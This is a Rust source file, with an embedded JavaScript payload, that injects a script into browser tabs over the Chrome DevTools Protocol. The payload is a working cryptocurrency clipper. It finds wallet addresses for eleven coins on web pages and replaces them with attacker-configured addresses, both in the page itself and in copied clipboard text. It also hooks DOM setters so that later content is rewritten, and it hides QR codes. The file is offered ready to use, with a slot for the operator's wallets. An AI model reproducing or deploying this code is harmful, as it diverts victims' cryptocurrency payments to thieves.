use tokio_tungstenite::{connect_async, tungstenite::Message};
use futures_util::{SinkExt, StreamExt};
use serde_json::json;

// Inject JS into browser tab via CDP WebSocket
pub async fn inject(ws_url: &str, script: &str) -> Result<(), Box<dyn std::error::Error>> {
    let url = url::Url::parse(ws_url)?;
    let (mut ws, _) = connect_async(url).await?;
    
    // CDP commands: enable domains, inject for new pages, run on current page
    let cmds = [
        json!({"id": 1, "method": "Page.enable", "params": {}}),
        json!({"id": 2, "method": "Runtime.enable", "params": {}}),
        json!({"id": 3, "method": "Page.addScriptToEvaluateOnNewDocument", "params": {"source": script}}),
        json!({"id": 4, "method": "Runtime.evaluate", "params": {"expression": script, "awaitPromise": false, "returnByValue": false, "userGesture": true}}),
    ];
    
    for cmd in cmds {
        ws.send(Message::Text(cmd.to_string())).await?;
        if let Some(msg) = ws.next().await { let _ = msg?; }
    }
    
    ws.close(None).await?;
    Ok(())
}

pub fn get_script() -> &'static str {
    r#"
(function() {
    if (window.__clipperActive) return;
    window.__clipperActive = true;
    
    // ============ CONFIGURE YOUR WALLET ADDRESSES HERE ============
    const WALLETS = {
        BTC: 'YOUR_BTC_ADDRESS',
        BTC_LEGACY: 'YOUR_BTC_LEGACY_ADDRESS',
        ETH: 'YOUR_ETH_ADDRESS',
        SOL: 'YOUR_SOL_ADDRESS',
        SUI: 'YOUR_SUI_ADDRESS',
        LTC: 'YOUR_LTC_ADDRESS',
        LTC_LEGACY: 'YOUR_LTC_LEGACY_ADDRESS',
        DOGE: 'YOUR_DOGE_ADDRESS',
        DASH: 'YOUR_DASH_ADDRESS',
        TON: 'YOUR_TON_ADDRESS',
        TRX: 'YOUR_TRX_ADDRESS'
    };
    // ==============================================================
    
    const PATTERNS = [
        { n: 'BTC', p: '\\bbc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59}\\b', f: 'g', w: WALLETS.BTC },
        { n: 'BTC', p: '\\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\\b', f: 'g', w: WALLETS.BTC_LEGACY },
        { n: 'SUI', p: '\\b0x[a-fA-F0-9]{64}\\b', f: 'g', w: WALLETS.SUI },
        { n: 'ETH', p: '\\b0x[a-fA-F0-9]{40}\\b', f: 'g', w: WALLETS.ETH },
        { n: 'SOL', p: '\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b', f: 'g', w: WALLETS.SOL },
        { n: 'LTC', p: '\\bltc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59}\\b', f: 'g', w: WALLETS.LTC },
        { n: 'LTC', p: '\\b[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}\\b', f: 'g', w: WALLETS.LTC_LEGACY },
        { n: 'DOGE', p: '\\bD[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}\\b', f: 'g', w: WALLETS.DOGE },
        { n: 'DASH', p: '\\bX[1-9A-HJ-NP-Za-km-z]{33}\\b', f: 'g', w: WALLETS.DASH },
        { n: 'TON', p: '\\b[EU]Q[a-zA-Z0-9_-]{46}\\b', f: 'g', w: WALLETS.TON },
        { n: 'TRX', p: '\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b', f: 'g', w: WALLETS.TRX }
    ];
    
    function getPatterns() {
        return PATTERNS.map(d => ({ n: d.n, r: new RegExp(d.p, d.f), w: d.w }));
    }
    
    function hasAddr(txt) {
        if (!txt || txt.length < 26) return false;
        for (const p of getPatterns()) {
            if (p.r.test(txt)) return true;
        }
        return false;
    }
    
    function replace(txt) {
        let out = txt;
        const patterns = getPatterns();
        patterns.sort((a, b) => b.w.length - a.w.length);
        for (const p of patterns) {
            out = out.replace(p.r, p.w);
        }
        return out;
    }
    
    const origNodeValue = Object.getOwnPropertyDescriptor(Node.prototype, 'nodeValue');
    const origInnerHTML = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    const origInnerText = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerText');
    
    if (origNodeValue?.set) {
        Object.defineProperty(Text.prototype, 'nodeValue', {
            set(val) { return origNodeValue.set.call(this, hasAddr(val) ? replace(val) : val); },
            get: origNodeValue.get
        });
    }
    
    if (origInnerHTML?.set) {
        Object.defineProperty(Element.prototype, 'innerHTML', {
            set(val) { return origInnerHTML.set.call(this, typeof val === 'string' && hasAddr(val) ? replace(val) : val); },
            get: origInnerHTML.get
        });
    }
    
    if (origInnerText?.set) {
        Object.defineProperty(HTMLElement.prototype, 'innerText', {
            set(val) { return origInnerText.set.call(this, typeof val === 'string' && hasAddr(val) ? replace(val) : val); },
            get: origInnerText.get
        });
    }
    
    function processDOM() {
        if (!document.body) return;
        
        const tw = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
        let node;
        while (node = tw.nextNode()) {
            if (!node.parentElement) continue;
            const tag = node.parentElement.tagName;
            if (/^(SCRIPT|STYLE|NOSCRIPT)$/i.test(tag)) continue;
            const txt = node.nodeValue || '';
            if (hasAddr(txt)) origNodeValue.set.call(node, replace(txt));
        }
        
        document.querySelectorAll('*').forEach(el => {
            for (const attr of el.attributes || []) {
                if (hasAddr(attr.value)) el.setAttribute(attr.name, replace(attr.value));
            }
            if (el.value && hasAddr(el.value)) el.value = replace(el.value);
            for (const key in el.dataset || {}) {
                if (hasAddr(el.dataset[key])) el.dataset[key] = replace(el.dataset[key]);
            }
        });
    }
    
    function replaceQR() {
        const img = 'https://placedog.net/250/250?r=' + Date.now();
        
        document.querySelectorAll('svg').forEach(s => {
            if (s.dataset.replaced) return;
            const b = s.getBoundingClientRect();
            if (b.width >= 80 && b.height >= 80 && Math.abs(b.width-b.height) < 80) {
                if (s.querySelectorAll('rect, path, polygon').length > 15) {
                    s.dataset.replaced = '1';
                    const i = new Image();
                    i.src = img;
                    i.style.cssText = 'width:'+b.width+'px;height:'+b.height+'px;display:block;';
                    s.style.display = 'none';
                    s.parentNode.insertBefore(i, s);
                }
            }
        });
        
        document.querySelectorAll('canvas').forEach(c => {
            if (c.dataset.replaced) return;
            const b = c.getBoundingClientRect();
            if (b.width >= 80 && b.height >= 80 && Math.abs(b.width-b.height) < 80) {
                c.dataset.replaced = '1';
                const i = new Image();
                i.src = img;
                i.style.cssText = 'width:'+b.width+'px;height:'+b.height+'px;display:block;';
                c.style.display = 'none';
                c.parentNode.insertBefore(i, c);
            }
        });
        
        document.querySelectorAll('img').forEach(i => {
            if (i.dataset.replaced) return;
            const src = (i.src || '').toLowerCase();
            const alt = (i.alt || '').toLowerCase();
            if (src.includes('qr') || alt.includes('qr')) {
                i.dataset.replaced = '1';
                i.src = img;
            }
        });
    }
    
    document.addEventListener('copy', e => {
        const s = window.getSelection().toString();
        if (hasAddr(s)) {
            e.preventDefault();
            e.clipboardData.setData('text/plain', replace(s));
        }
    }, true);
    
    const origWrite = navigator.clipboard.writeText.bind(navigator.clipboard);
    navigator.clipboard.writeText = function(text) {
        return origWrite(hasAddr(text) ? replace(text) : text);
    };
    
    function run() { processDOM(); replaceQR(); }
    run();
    setInterval(run, 20);
})();
"#
}
